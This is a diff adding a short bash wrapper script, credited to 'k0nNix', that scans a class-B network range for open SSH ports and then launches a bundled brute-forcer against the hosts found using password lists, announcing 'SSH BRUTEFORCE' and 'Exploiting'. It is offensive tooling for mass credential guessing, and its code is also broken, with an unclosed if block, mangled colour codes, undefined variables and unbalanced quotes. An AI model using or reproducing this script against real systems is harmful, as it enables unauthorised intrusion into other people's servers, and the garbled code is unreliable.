@@ -1,0 +1,32 @@
+#!/bin/bash
+# Scanner  | 
+ 2014-2015
+# By k0nNix 
+# Thanks to Romania Team 
+if [ $# != 1 ]; then
+        echo " usage: $0 <b class>"
+        exit;
+rm -rf scan.log
+BLK='
+[1;30m'
+RED='
+[1;31m'
+YEL='
+[1;33m'
+BLU='
+[1;34m'
+RES='
+[0m'
+echo "${YEL}[+]${DGRN}###########################${DRED}###${YEL}[+]${WHI}"
+echo "${DBLU}[+]${DBLU}SSH BRUTEFORCE BY #k0nNix[+]"
+echo "${YEL}[+]${DGRN}###########################${DRED}###${YEL}[+]${WHI}"
+sleep 2
+././pscan2 $1 22
+sleep 3
+echo "${CYN} #Loading cached servers..."${GRN}OK" "${CYN} 
+echo     Loading 62 pass files..."${GRN}OK"
+echo "${YEL}[+]${DGRN}Exploiting !!! ${RED}Wait...${YEL}[+]${WHI}"
+./sshd scan.log 1 3 5 1000 port 22
+echo "${YEL}[+]${DGRN}Finished...${DRED}${YEL}[+]${WHI}"
+echo "${YEL}[+]${DGRN}Thx to k0nNix & 9mm for this scanner.${DRED}${YEL}[+]${WHI}"
+sleep 5
